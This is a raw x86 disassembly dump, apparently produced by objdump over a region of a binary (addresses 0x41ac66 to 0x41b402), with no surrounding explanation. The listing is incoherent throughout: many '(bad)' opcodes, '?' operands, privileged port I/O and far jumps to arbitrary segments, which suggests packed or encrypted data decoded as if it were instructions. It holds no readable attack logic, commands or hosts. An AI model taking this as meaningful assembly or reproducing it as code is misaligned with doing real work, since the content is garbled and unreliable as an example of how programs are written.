  41ac66:	jae    0x41acd7
  41ac68:	pop    esi
  41ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac6a:	inc    eax
  41ac6b:	sub    ch,0x2
  41ac6e:	pop    edx
  41ac6f:	push   0xffffff9b
  41ac71:	test   DWORD PTR [edx+eax*8],edi
  41ac74:	gs pop ds
  41ac76:	pop    eax
  41ac77:	cs inc eax
  41ac79:	inc    eax
  41ac7a:	stos   BYTE PTR es:[edi],al
  41ac7b:	or     DWORD PTR [edi-0x61165889],esp
  41ac81:	pop    edi
  41ac82:	mov    ah,0x7e
  41ac84:	adc    esi,DWORD PTR [eax+ecx*4]
  41ac87:	test   eax,0x8db69f1
  41ac8c:	call   esp
  41ac8e:	push   ebx
  41ac8f:	jmp    0x612a:0xd8e63a8a
  41ac96:	imul   ebp,DWORD PTR [edi+0x18d3260a],0xffffffd4
  41ac9d:	dec    ecx
  41ac9e:	aas    
  41ac9f:	daa    
  41aca0:	push   ss
  41aca1:	aam    0xb
  41aca3:	pop    esp
  41aca4:	(bad)  
  41aca5:	dec    edi
  41aca6:	jno    0x41ace2
  41aca8:	jecxz  0x41ac4e
  41acaa:	or     BYTE PTR [ebx+eiz*1+0x86308eb],al
  41acb1:	scas   al,BYTE PTR es:[edi]
  41acb2:	ror    DWORD PTR [ecx+0x7],1
  41acb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acb6:	push   edx
  41acb7:	arpl   WORD PTR [edi-0x72],ax
  41acba:	gs mov dl,0x22
  41acbd:	adc    edi,DWORD PTR [esi+ebx*8-0x7ca3c794]
  41acc4:	aaa    
  41acc5:	bt     eax,edx
  41acc8:	cmp    ecx,DWORD PTR [edx+edi*4-0x2]
  41accc:	mov    ebp,0x8a45bc30
  41acd1:	pop    edx
  41acd2:	retf   
  41acd3:	mov    eax,ds:0xe7ee1732
  41acd8:	and    dh,bl
  41acda:	and    eax,0xe12f45f8
  41acdf:	add    DWORD PTR [esi],eax
  41ace1:	(bad)  
  41ace2:	adc    al,0x1e
  41ace4:	pop    edi
  41ace5:	push   esp
  41ace6:	or     BYTE PTR [esi-0x402196ae],al
  41acec:	xor    ecx,DWORD PTR [ebx-0x616164ab]
  41acf2:	xchg   ebp,eax
  41acf3:	xchg   dh,bl
  41acf5:	mov    edx,0x58ecd5d
  41acfa:	imul   esp,DWORD PTR [ebx+0x21832259],0x35
  41ad01:	mov    al,0x72
  41ad03:	daa    
  41ad04:	cmp    esi,edx
  41ad06:	sti    
  41ad07:	dec    esi
  41ad08:	pop    ebp
  41ad09:	adc    BYTE PTR [eax],0x9b
  41ad0c:	mov    esi,DWORD PTR [edi+0x1c]
  41ad0f:	mov    ebx,0x8c349a68
  41ad14:	retf   0xc05a
  41ad17:	repz int 0x56
  41ad1a:	repz test eax,0xa37f92b2
  41ad20:	adc    al,al
  41ad22:	rcr    DWORD PTR [ebx],cl
  41ad24:	pop    eax
  41ad25:	shr    dl,0x5a
  41ad28:	adc    al,0x62
  41ad2a:	push   ebp
  41ad2b:	xor    bl,BYTE PTR [ebx+0x549789c2]
  41ad31:	xor    DWORD PTR [edi],eax
  41ad33:	or     DWORD PTR [eax-0x65b0cbd7],edx
  41ad39:	leave  
  41ad3a:	imul   ecx,DWORD PTR [eax+0x19237e89],0xe49e9db3
  41ad44:	mov    eax,ds:0x4d74a471
  41ad49:	cmp    esi,0x4c
  41ad4c:	repnz stos BYTE PTR es:[edi],al
  41ad4e:	ficom  WORD PTR [edi-0x50b5d99d]
  41ad54:	push   ebp
  41ad55:	and    esp,0x1b9d3c26
  41ad5b:	xchg   ax,ax
  41ad5d:	call   0xd3e3:0xa303b1ed
  41ad64:	xor    DWORD PTR [edi],esi
  41ad66:	test   al,0xf
  41ad68:	je     0x41ad56
  41ad6a:	scas   eax,DWORD PTR es:[edi]
  41ad6b:	arpl   WORD PTR fs:[eax-0xb],sp
  41ad6f:	push   ebx
  41ad70:	addr16 sbb eax,0x3fac0817
  41ad76:	mov    ds:0x7e6f32fd,al
  41ad7b:	mov    dl,BYTE PTR [eax+edx*4+0x1294075e]
  41ad82:	mov    bh,0x7d
  41ad84:	retf   0xc83f
  41ad87:	loopne 0x41ad58
  41ad89:	loope  0x41ad33
  41ad8b:	sub    eax,0x26501559
  41ad90:	les    ebp,FWORD PTR [ecx-0x4d]
  41ad93:	xchg   ebp,edi
  41ad95:	int    0xb2
  41ad97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad98:	stos   DWORD PTR es:[edi],eax
  41ad99:	jp     0x41ad81
  41ad9b:	cmp    al,0xef
  41ad9d:	fsubp  st(1),st
  41ad9f:	shl    DWORD PTR [ebx+0x1f7b918f],0xce
  41ada6:	jl     0x41adf9
  41ada8:	int    0x18
  41adaa:	aam    0xa2
  41adac:	push   ds
  41adad:	sub    bl,BYTE PTR [esi-0xb]
  41adb0:	clc    
  41adb1:	jle    0x41ae15
  41adb3:	sub    DWORD PTR [edi],ebx
  41adb5:	(bad)  
  41adb6:	loopne 0x41ae2c
  41adb8:	lods   eax,DWORD PTR ds:[esi]
  41adb9:	fcomp  DWORD PTR [ebp-0xe194b32]
  41adbf:	out    dx,al
  41adc0:	push   esp
  41adc1:	push   ebp
  41adc2:	cmc    
  41adc3:	cld    
  41adc4:	xor    cl,bh
  41adc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc7:	jnp    0x41adf4
  41adc9:	cdq    
  41adca:	push   esi
  41adcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adcc:	sbb    eax,0x92dc6be2
  41add1:	jne    0x41ae30
  41add3:	je     0x41ad77
  41add5:	test   al,0xce
  41add7:	outs   dx,BYTE PTR ds:[esi]
  41add8:	xchg   esi,eax
  41add9:	lds    esi,FWORD PTR ds:0xd6b83e24
  41addf:	or     BYTE PTR ss:[ecx-0x33],dl
  41ade3:	sti    
  41ade4:	or     BYTE PTR [esi],0x68
  41ade7:	aam    0xcd
  41ade9:	ud2    
  41adeb:	int3   
  41adec:	retf   
  41aded:	jbe    0x41ae05
  41adef:	sahf   
  41adf0:	pop    esp
  41adf1:	mov    ebx,0xc546ebf4
  41adf6:	jg     0x41ae16
  41adf8:	daa    
  41adf9:	mov    bl,0xe7
  41adfb:	test   cl,dl
  41adfd:	shl    BYTE PTR [ebp+ebp*4+0x7f],1
  41ae01:	in     al,0x66
  41ae03:	mov    DWORD PTR [eax],ebp
  41ae05:	clc    
  41ae06:	(bad)  
  41ae07:	popf   
  41ae08:	and    al,bl
  41ae0a:	xor    al,0x10
  41ae0c:	hlt    
  41ae0d:	outs   dx,DWORD PTR ds:[esi]
  41ae0e:	stos   DWORD PTR es:[edi],eax
  41ae0f:	mov    bl,0x8d
  41ae11:	push   ebp
  41ae12:	xor    eax,0x593567fe
  41ae17:	jae    0x41adf9
  41ae19:	cdq    
  41ae1a:	sub    edi,DWORD PTR [edx-0x9d9f472]
  41ae20:	push   edx
  41ae21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae22:	sub    cl,BYTE PTR fs:[eax+0xe7308f4]
  41ae29:	mov    esp,0x1f959a6b
  41ae2e:	in     eax,0x53
  41ae30:	cld    
  41ae31:	cli    
  41ae32:	sti    
  41ae33:	mov    ds:0x37e9d6a1,eax
  41ae38:	enter  0xe6d2,0x57
  41ae3c:	jns    0x41adda
  41ae3e:	xor    DWORD PTR [ebp+0x25fed796],0x4b
  41ae45:	dec    eax
  41ae46:	and    DWORD PTR [edx+0x29dd48d8],ecx
  41ae4c:	cmp    eax,0xfa02d2f7
  41ae51:	xchg   DWORD PTR ds:0xbed9d675,ebx
  41ae57:	test   al,0x80
  41ae59:	add    BYTE PTR [edi],cl
  41ae5b:	xor    al,0x9d
  41ae5d:	mov    ch,BYTE PTR [esi-0x2d]
  41ae60:	enter  0x7cb3,0x6
  41ae64:	ret    0x2e39
  41ae67:	out    0xaf,al
  41ae69:	xor    al,0x86
  41ae6b:	(bad)  
  41ae6c:	std    
  41ae6d:	xchg   BYTE PTR es:[esi-0x12066a77],ah
  41ae74:	jmp    0x858b79a6
  41ae79:	inc    esi
  41ae7a:	scas   eax,DWORD PTR es:[edi]
  41ae7b:	push   esp
  41ae7c:	or     ebx,esp
  41ae7e:	pop    eax
  41ae7f:	sub    al,0x2b
  41ae81:	mov    bh,0xfe
  41ae83:	sub    esi,edi
  41ae85:	jne    0x41aed7
  41ae87:	cmp    eax,0xe4a3773a
  41ae8c:	loope  0x41aec0
  41ae8e:	icebp  
  41ae8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae90:	pop    ds
  41ae91:	into   
  41ae92:	xchg   esp,eax
  41ae93:	and    eax,0x803a5047
  41ae98:	sahf   
  41ae99:	in     eax,0x7d
  41ae9b:	and    BYTE PTR [ecx+eax*2+0x7d],ch
  41ae9f:	ja     0x41ae62
  41aea1:	dec    ebp
  41aea2:	xor    al,bh
  41aea4:	add    ebx,DWORD PTR [edx+edx*1+0x4f138ba5]
  41aeab:	mov    ecx,?
  41aead:	rol    BYTE PTR [ebx],0x0
  41aeb0:	push   ebp
  41aeb1:	push   ss
  41aeb2:	cmc    
  41aeb3:	adc    BYTE PTR [edi-0x5f87540a],ah
  41aeb9:	inc    ebx
  41aeba:	mov    cl,0xd9
  41aebc:	sub    al,BYTE PTR [ecx+0x36]
  41aebf:	add    al,0x19
  41aec1:	sbb    eax,0x4855d45d
  41aec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec7:	cmp    al,0x48
  41aec9:	or     al,0x9c
  41aecb:	mov    eax,0x5b29e15a
  41aed0:	leave  
  41aed1:	xchg   esi,eax
  41aed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed3:	pop    ebx
  41aed4:	add    ch,BYTE PTR [edx-0x226e5c01]
  41aeda:	mov    DWORD PTR [ecx],eax
  41aedc:	push   edi
  41aedd:	(bad)  
  41aede:	mov    ds:0xae423108,al
  41aee3:	stc    
  41aee4:	dec    esi
  41aee5:	stos   DWORD PTR es:[edi],eax
  41aee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee7:	xor    al,0xaf
  41aee9:	add    DWORD PTR [edi+ebp*1],ebx
  41aeec:	daa    
  41aeed:	out    dx,eax
  41aeee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeef:	dec    esi
  41aef0:	inc    ecx
  41aef1:	hlt    
  41aef2:	add    BYTE PTR [ebx+0x16],bh
  41aef5:	xor    DWORD PTR [edx],edi
  41aef7:	push   edi
  41aef8:	mov    edi,0x4fd0caeb
  41aefd:	ror    ch,0xc0
  41af00:	jmp    0xb0fc:0xd048454e
  41af07:	mov    esi,0x2ef561fd
  41af0c:	mov    ds:0x1d8ae628,eax
  41af11:	cmp    DWORD PTR [edx],esi
  41af13:	xor    bh,dh
  41af15:	jno    0x41af5e
  41af17:	mov    cl,0x8b
  41af19:	pushf  
  41af1a:	lock jmp 0x41aeda
  41af1d:	repnz xor BYTE PTR [ecx],bl
  41af20:	and    eax,0x9425c7a2
  41af25:	sbb    esi,ebx
  41af27:	pop    edi
  41af28:	and    al,0x38
  41af2a:	leave  
  41af2b:	ret    
  41af2c:	pop    eax
  41af2d:	pushw  cs
  41af2f:	mov    ds:0xfc26a74a,al
  41af34:	mov    ecx,edi
  41af36:	xchg   esp,eax
  41af37:	sbb    BYTE PTR [eax+0x4],ch
  41af3a:	dec    ecx
  41af3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af3c:	call   0x244b:0x956bbee1
  41af43:	jmp    0x6557:0xd224f9eb
  41af4a:	mov    cl,BYTE PTR [ebp+0x2a716461]
  41af50:	pop    es
  41af51:	cmc    
  41af52:	or     eax,0xaa3a6562
  41af57:	out    dx,al
  41af58:	lds    ecx,FWORD PTR [eax-0x35]
  41af5b:	mov    dh,0xbf
  41af5d:	push   0x5e70e245
  41af62:	gs dec ecx
  41af64:	or     bh,cl
  41af66:	cmp    al,0x7
  41af68:	or     dl,al
  41af6a:	jo     0x41af14
  41af6c:	out    0x0,eax
  41af6e:	mov    ch,dl
  41af70:	jns    0x41aff1
  41af72:	test   eax,0x844bf070
  41af77:	mov    esp,0x4178c43
  41af7c:	cld    
  41af7d:	addr16 cmp eax,0x4e499a53
  41af83:	(bad)
  41af86:	enter  0x6073,0x31
  41af8a:	lods   al,BYTE PTR ds:[esi]
  41af8b:	(bad)  
  41af8c:	imul   edi,DWORD PTR [ebx+0xe],0x73
  41af90:	stos   DWORD PTR es:[edi],eax
  41af91:	pop    ss
  41af92:	mov    esp,0x34879956
  41af97:	dec    edi
  41af98:	add    dl,cl
  41af9a:	hlt    
  41af9b:	inc    ebx
  41af9c:	enter  0x1ef0,0xaa
  41afa0:	retf   
  41afa1:	sub    eax,0x5820ebd8
  41afa6:	adc    ah,BYTE PTR [ebx]
  41afa8:	loope  0x41b01a
  41afaa:	in     eax,0xa6
  41afac:	iret   
  41afad:	xchg   ebp,eax
  41afae:	xchg   BYTE PTR [eax],cl
  41afb0:	xor    dh,BYTE PTR [edx]
  41afb2:	std    
  41afb3:	in     eax,dx
  41afb4:	xchg   BYTE PTR [edi],al
  41afb6:	dec    edi
  41afb7:	iret   
  41afb8:	mov    dh,BYTE PTR [esi]
  41afba:	jb     0x41afa6
  41afbc:	arpl   WORD PTR [edx-0x15c534b6],sp
  41afc2:	dec    edx
  41afc3:	cld    
  41afc4:	fisttp DWORD PTR [edx+0x159478df]
  41afca:	sub    DWORD PTR [ecx+0x6b30bcf],ecx
  41afd0:	iret   
  41afd1:	dec    ebx
  41afd2:	mov    edi,0xfc14c3c6
  41afd7:	cwde   
  41afd8:	ret    
  41afd9:	mov    ds:0x656773a2,al
  41afde:	dec    ebp
  41afdf:	fcomp  st(5)
  41afe1:	inc    edx
  41afe2:	ror    DWORD PTR [esi],1
  41afe4:	sub    BYTE PTR [edi],al
  41afe6:	pop    esi
  41afe7:	in     al,dx
  41afe8:	retf   0x78a9
  41afeb:	in     al,dx
  41afec:	dec    esp
  41afed:	xor    eax,0x3c01d82d
  41aff2:	fucomi st,st(3)
  41aff4:	add    BYTE PTR [edi-0x7f77d757],0xc0
  41affb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41affc:	rcl    BYTE PTR [ecx+0x79],1
  41afff:	cld    
  41b000:	or     eax,0x4bc8f7c8
  41b005:	cld    
  41b006:	add    DWORD PTR [eax],0x62ccf4c9
  41b00c:	andnps xmm1,XMMWORD PTR [ecx]
  41b00f:	sub    dl,BYTE PTR [ebx+0xea23cc2]
  41b015:	xchg   DWORD PTR [eax],ebx
  41b017:	push   ds
  41b018:	js     0x41b04f
  41b01a:	ss scas al,BYTE PTR es:[edi]
  41b01c:	push   edi
  41b01d:	adc    ecx,DWORD PTR [ebp-0x7]
  41b020:	aas    
  41b021:	mov    esp,0x44825314
  41b026:	sub    BYTE PTR [esi+0x442c24af],dl
  41b02c:	dec    eax
  41b02d:	ja     0x41b079
  41b02f:	sti    
  41b030:	lods   eax,DWORD PTR ds:[esi]
  41b031:	mov    al,0x98
  41b033:	popf   
  41b034:	pop    ebx
  41b035:	stos   BYTE PTR es:[edi],al
  41b036:	jle    0x41b096
  41b038:	mov    eax,0x3e9be133
  41b03d:	fadd   st,st(6)
  41b03f:	adc    esp,edx
  41b041:	inc    ebp
  41b042:	sub    bl,BYTE PTR ds:0xd9a30856
  41b048:	jns    0x41b038
  41b04a:	sbb    al,0xe9
  41b04c:	and    eax,0x8302b043
  41b051:	(bad)  
  41b052:	jae    0x41b058
  41b054:	repz mov ah,BYTE PTR [eax+0x330018f1]
  41b05b:	aas    
  41b05c:	repz in al,0xfa
  41b05f:	sar    edx,0xd7
  41b062:	inc    edi
  41b063:	mov    bh,0xcc
  41b065:	dec    ebx
  41b066:	(bad)  
  41b067:	popa   
  41b068:	fimul  WORD PTR [ebx]
  41b06a:	leave  
  41b06b:	aaa    
  41b06c:	cmp    eax,0x3b8d6388
  41b071:	cmp    al,0x6c
  41b073:	ss cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b076:	mov    edx,0x9b8bacf3
  41b07b:	sbb    DWORD PTR [esi],esi
  41b07d:	int3   
  41b07e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b07f:	fwait
  41b080:	jl     0x41b0dc
  41b082:	arpl   si,bx
  41b084:	xchg   BYTE PTR [ebx-0x3a458341],bl
  41b08a:	jle    0x41b0f6
  41b08c:	pusha  
  41b08d:	pushf  
  41b08e:	jge    0x41b09d
  41b090:	jnp    0x41b0d4
  41b092:	dec    ebx
  41b093:	in     al,0xd6
  41b095:	(bad)  
  41b097:	sahf   
  41b098:	cmp    dh,ah
  41b09a:	or     ebx,DWORD PTR [edi+0x2ccc063c]
  41b0a0:	ins    BYTE PTR es:[edi],dx
  41b0a1:	ja     0x41b10c
  41b0a3:	sti    
  41b0a4:	mov    esi,0x53631893
  41b0a9:	inc    eax
  41b0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ab:	out    0xd8,eax
  41b0ad:	mov    ecx,0xcb60a64b
  41b0b2:	and    DWORD PTR [edx-0x1d],ecx
  41b0b5:	gs inc edi
  41b0b7:	add    ah,BYTE PTR [ebx+0x54733739]
  41b0bd:	add    DWORD PTR [esi+eiz*2],0x3568f670
  41b0c4:	lea    eax,[ecx+edx*4-0x1f1ae267]
  41b0cb:	mov    ss,edi
  41b0cd:	or     BYTE PTR [edx-0x68],bh
  41b0d0:	pop    es
  41b0d1:	mov    cl,0x0
  41b0d3:	retf   
  41b0d4:	mov    bl,0xb7
  41b0d6:	mov    BYTE PTR [ebp+eax*1-0x43],dl
  41b0da:	sbb    esp,eax
  41b0dc:	pcmpeqb mm1,QWORD PTR [ecx-0xf]
  41b0e0:	test   DWORD PTR [eax+0x375e4a9b],ebp
  41b0e6:	loope  0x41b07d
  41b0e8:	(bad)  [eax+0x6f]
  41b0eb:	sti    
  41b0ec:	shl    DWORD PTR [esi+0xe],1
  41b0ef:	(bad)  
  41b0f0:	pop    esi
  41b0f1:	push   0xffffff93
  41b0f3:	dec    ebp
  41b0f4:	push   0xa8fe53f2
  41b0f9:	cwde   
  41b0fa:	add    ecx,DWORD PTR [esi+0x7af71e14]
  41b100:	jmp    0x610ee02c
  41b105:	jae    0x41b136
  41b107:	pop    esi
  41b108:	pop    eax
  41b109:	bound  esp,QWORD PTR [esi+0x32e06785]
  41b10f:	mov    WORD PTR [edx-0x59f959e2],?
  41b115:	xchg   DWORD PTR [esi],edx
  41b117:	xchg   edx,eax
  41b118:	pop    ebp
  41b119:	or     BYTE PTR cs:[edi+ebx*2-0x1a],dh
  41b11e:	test   dl,al
  41b120:	mov    bl,0xb0
  41b122:	pop    ds
  41b123:	int    0x85
  41b125:	data16 ficomp DWORD PTR ds:0xb43dc5b0
  41b12c:	imul   edx,DWORD PTR [esi+edx*1+0x58ad1996],0x57e8a321
  41b137:	jns    0x41b0f5
  41b139:	scas   al,BYTE PTR es:[edi]
  41b13a:	push   edi
  41b13b:	inc    ebx
  41b13c:	mov    ?,ebx
  41b13e:	cs repz jae 0x41b0d2
  41b142:	and    cl,BYTE PTR cs:[edi+0x76]
  41b146:	adc    ch,BYTE PTR cs:[edi+0x5261b130]
  41b14d:	push   edi
  41b14e:	xor    bh,BYTE PTR [esi+esi*4-0x6776d488]
  41b155:	jae    0x41b1c7
  41b157:	xchg   DWORD PTR [ecx+0x7e12cf99],esi
  41b15d:	aaa    
  41b15e:	das    
  41b15f:	jle    0x41b174
  41b161:	jno    0x41b109
  41b163:	iret   
  41b164:	lods   eax,DWORD PTR ds:[esi]
  41b165:	xor    bh,BYTE PTR [edx+0x6b]
  41b168:	adc    edi,0xffffffd0
  41b16b:	mov    ebx,0xc94207aa
  41b170:	not    BYTE PTR [edx]
  41b172:	rcl    bh,cl
  41b174:	jmp    0x63ad4d2c
  41b179:	bound  edx,QWORD PTR [ecx+0x54]
  41b17c:	push   ebp
  41b17d:	fidiv  DWORD PTR [eax]
  41b17f:	imul   ecx,DWORD PTR [ebx+0x250836eb],0xfcde2a24
  41b189:	jl     0x41b1b2
  41b18b:	dec    ecx
  41b18c:	into   
  41b18d:	adc    ah,BYTE PTR [edi]
  41b18f:	add    BYTE PTR [edi-0x6ef351d9],dh
  41b195:	ins    DWORD PTR es:[edi],dx
  41b196:	xchg   edx,eax
  41b197:	fldcw  WORD PTR [esi+0x2a612ecb]
  41b19d:	mov    cl,BYTE PTR [ebx+0x4b]
  41b1a0:	pushf  
  41b1a1:	ficomp WORD PTR [edi+0x4c]
  41b1a4:	add    al,0xc7
  41b1a6:	pop    es
  41b1a7:	or     al,0x41
  41b1a9:	mov    bh,0xc7
  41b1ab:	dec    si
  41b1ad:	inc    BYTE PTR ds:0x628058f0
  41b1b3:	pop    eax
  41b1b4:	not    ecx
  41b1b6:	arpl   WORD PTR [esi-0x57],cx
  41b1b9:	std    
  41b1ba:	add    eax,0xda25a1e6
  41b1bf:	lock mov WORD PTR [ecx-0xa970198],gs
  41b1c6:	push   ebx
  41b1c7:	lahf   
  41b1c8:	sbb    al,0x12
  41b1ca:	xchg   DWORD PTR [ebp-0x7da3f909],ecx
  41b1d0:	call   0x3d40:0x1b252a16
  41b1d7:	push   ss
  41b1d8:	in     eax,0xab
  41b1da:	hlt    
  41b1db:	imul   ebx,DWORD PTR [ebx-0x2dcc3f1c],0xa
  41b1e2:	add    al,0xb
  41b1e4:	leave  
  41b1e5:	jle    0x41b195
  41b1e7:	and    esi,edx
  41b1e9:	mov    ebx,0x40a4c2c7
  41b1ee:	inc    esp
  41b1ef:	adc    BYTE PTR [edi+0x42],ah
  41b1f2:	ja     0x41b1cc
  41b1f4:	hlt    
  41b1f5:	bound  edx,QWORD PTR [eax+edx*2-0x3d]
  41b1f9:	std    
  41b1fa:	inc    esp
  41b1fb:	mov    ah,0x55
  41b1fd:	lock dec edi
  41b1ff:	scas   eax,DWORD PTR es:[edi]
  41b200:	jae    0x41b253
  41b202:	adc    DWORD PTR [esi],0x2d
  41b205:	in     al,0x8
  41b207:	in     al,dx
  41b208:	xor    BYTE PTR [ecx],bh
  41b20a:	in     eax,0x99
  41b20c:	lods   eax,DWORD PTR ds:[esi]
  41b20d:	shr    DWORD PTR [ebx+0x45],1
  41b210:	and    dl,al
  41b212:	lods   eax,DWORD PTR ds:[esi]
  41b213:	dec    edx
  41b214:	mov    dl,0x67
  41b216:	pop    ebp
  41b217:	adc    bh,BYTE PTR [ebx+edx*8-0x19]
  41b21b:	xor    al,0xfd
  41b21d:	push   ecx
  41b21e:	scas   al,BYTE PTR es:[edi]
  41b21f:	jmp    0x41b1cc
  41b221:	jae    0x41b213
  41b223:	xor    BYTE PTR [edx+eiz*2+0x6ae4d482],bh
  41b22a:	ds adc eax,0xa8c834e1
  41b230:	sub    BYTE PTR [ebx+0x1a],ch
  41b233:	popf   
  41b234:	std    
  41b235:	pop    ss
  41b236:	(bad)  
  41b237:	mov    esi,0xfa582bfd
  41b23c:	sbb    eax,0xf99d92a
  41b241:	and    bh,BYTE PTR [esi+eax*1]
  41b244:	adc    edi,DWORD PTR [edi-0x3ab8cae6]
  41b24a:	push   esi
  41b24b:	jmp    0x4687a3d2
  41b250:	loop   0x41b23f
  41b252:	push   ebx
  41b253:	nop
  41b254:	fcomp  QWORD PTR [edi+edx*1]
  41b257:	cwde   
  41b258:	test   DWORD PTR [edi],eax
  41b25a:	xchg   BYTE PTR [ebx+0x808e8e2],dl
  41b260:	cmp    ecx,0x20
  41b263:	sbb    eax,0x7d5742ce
  41b268:	add    bl,dh
  41b26a:	adc    ebx,0x640748a4
  41b270:	mov    eax,ds:0x9560d74e
  41b275:	jg     0x41b2b3
  41b277:	or     eax,0xd084d798
  41b27c:	jae    0x41b29b
  41b27e:	add    DWORD PTR [eax-0x6f],eax
  41b281:	sub    esi,DWORD PTR [esi+0x5218668d]
  41b287:	push   eax
  41b289:	fidivr WORD PTR [esi+eiz*1-0x4e]
  41b28d:	pusha  
  41b28e:	(bad)  [eax-0x39f9870a]
  41b294:	add    ecx,edx
  41b296:	push   esp
  41b297:	or     ebx,DWORD PTR [esi+0x3e]
  41b29a:	out    0x12,al
  41b29c:	mov    DWORD PTR [eax],ecx
  41b29e:	and    eax,0x6312f1ed
  41b2a3:	mov    dl,0xfb
  41b2a5:	push   esp
  41b2a6:	cmc    
  41b2a7:	dec    ecx
  41b2a8:	ins    DWORD PTR es:[edi],dx
  41b2a9:	test   eax,0x29cd1ef1
  41b2ae:	cld    
  41b2af:	outs   dx,BYTE PTR ds:[esi]
  41b2b0:	add    eax,0xc1496da
  41b2b5:	push   ecx
  41b2b6:	mov    dh,0x6a
  41b2b8:	sub    ebp,esp
  41b2ba:	inc    ecx
  41b2bb:	ss add al,0x7e
  41b2be:	cmp    al,0x97
  41b2c0:	int3   
  41b2c1:	add    dl,BYTE PTR [ebp+0x7bb8d5f8]
  41b2c7:	loop   0x41b338
  41b2c9:	dec    ebx
  41b2ca:	xor    DWORD PTR ds:0x78f2090f,esp
  41b2d0:	cs ja  0x41b2c9
  41b2d3:	inc    ecx
  41b2d4:	outs   dx,DWORD PTR ds:[esi]
  41b2d5:	jo     0x41b308
  41b2d7:	and    esi,edi
  41b2d9:	test   eax,0x1c12b8c5
  41b2de:	jbe    0x41b289
  41b2e0:	sub    eax,0xaf4b27fe
  41b2e5:	pop    ss
  41b2e6:	and    BYTE PTR [ecx-0x66],cl
  41b2e9:	pop    edx
  41b2ea:	fistp  QWORD PTR [eax-0x407ae3a8]
  41b2f0:	pop    ebx
  41b2f1:	data16 jp 0x41b288
  41b2f4:	call   0xd7ede72b
  41b2f9:	mov    bl,0x74
  41b2fb:	sahf   
  41b2fc:	scas   al,BYTE PTR es:[edi]
  41b2fd:	push   cs
  41b2fe:	(bad)
  41b301:	lock pop edx
  41b303:	mov    edi,DWORD PTR [esi-0x1e]
  41b306:	ins    DWORD PTR es:[edi],dx
  41b307:	pop    ss
  41b308:	add    BYTE PTR [edx+eiz*4+0x5b40a238],bh
  41b30f:	mov    ch,0xcd
  41b311:	out    dx,al
  41b312:	sub    al,0x74
  41b314:	mov    al,0x3f
  41b316:	xor    ch,BYTE PTR [ebp+0x3f18b39c]
  41b31c:	push   esp
  41b31d:	xor    DWORD PTR ds:0x6c47b229,0x35
  41b324:	fldenv [esp+ebx*2-0x61]
  41b328:	mov    al,ds:0x6fba3c3e
  41b32d:	sub    BYTE PTR [ecx+0x7b],ch
  41b330:	inc    esp
  41b331:	sub    al,0xf
  41b333:	repnz xor DWORD PTR [eax+0x40c1e716],edx
  41b33a:	cmp    BYTE PTR [ebx+ebp*2-0x6a],dh
  41b33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b33f:	sar    DWORD PTR [ecx+0x5],1
  41b342:	out    0xea,eax
  41b344:	dec    DWORD PTR [ecx]
  41b346:	imul   eax,DWORD PTR [ebx-0x159ee86f],0xea14283f
  41b350:	and    DWORD PTR [edx+0x376e16df],0xffffffdb
  41b357:	adc    al,BYTE PTR [edx-0x33]
  41b35a:	lods   eax,DWORD PTR ds:[esi]
  41b35b:	inc    ecx
  41b35c:	mov    esp,0x4bf342e3
  41b361:	out    dx,eax
  41b362:	xor    DWORD PTR [eax+ebx*4+0x1e],0x44e435cb
  41b36a:	and    eax,0x541d905c
  41b36f:	pop    es
  41b370:	adc    eax,0x4fb688c3
  41b375:	pop    edx
  41b376:	push   cs
  41b377:	xor    DWORD PTR [ebx-0x65dbcc4b],0xb176ea21
  41b381:	cmp    BYTE PTR [ebx-0x70],cl
  41b384:	(bad)  
  41b385:	mov    dh,0x2f
  41b387:	out    0x56,eax
  41b389:	pop    ds
  41b38a:	outs   dx,BYTE PTR ds:[esi]
  41b38b:	mov    esp,0x4f24ce35
  41b390:	imul   esi,DWORD PTR [edx],0xffffffa6
  41b393:	mov    ebx,0x8807c19b
  41b398:	push   0x61373a22
  41b39d:	shl    DWORD PTR [ecx-0x50],0xaf
  41b3a1:	shr    DWORD PTR [eax+0x3f],0x95
  41b3a5:	adc    DWORD PTR [edi],eax
  41b3a7:	and    ch,BYTE PTR [eax]
  41b3a9:	jge    0x41b32f
  41b3ab:	(bad)  
  41b3ac:	xlat   BYTE PTR ds:[ebx]
  41b3ad:	enter  0x7031,0x83
  41b3b1:	loop   0x41b34b
  41b3b3:	or     BYTE PTR [ecx],0x2f
  41b3b6:	pop    ebx
  41b3b7:	ja     0x41b375
  41b3b9:	fdivp  st(7),st
  41b3bb:	mov    ebx,0x6c159e21
  41b3c0:	es pusha 
  41b3c2:	mov    ebp,eax
  41b3c4:	arpl   WORD PTR [ebp+0x16bc7ba3],cx
  41b3ca:	imul   esi,DWORD PTR [eax-0x38],0xffffffab
  41b3ce:	and    edx,DWORD PTR [esi+0x759f7534]
  41b3d4:	mov    ebp,0x5771e95e
  41b3d9:	cmp    eax,0xf7c9e4d5
  41b3de:	inc    ecx
  41b3df:	rol    BYTE PTR [ecx],0x49
  41b3e2:	xchg   BYTE PTR [esi-0x93e45de],dh
  41b3e8:	sbb    ebx,esi
  41b3ea:	jl     0x41b3d5
  41b3ec:	push   ss
  41b3ed:	sub    al,0x8c
  41b3ef:	xlat   BYTE PTR ds:[ebx]
  41b3f0:	shr    DWORD PTR [esi+ebp*4],cl
  41b3f3:	xchg   DWORD PTR [edx-0x1ad736b],edi
  41b3f9:	call   0x938cf72c
  41b3fe:	and    al,0xe2
  41b400:	adc    DWORD PTR [eax],ecx
  41b402:	sbb    BYTE PTR [ebp-0x6872cb95],cl
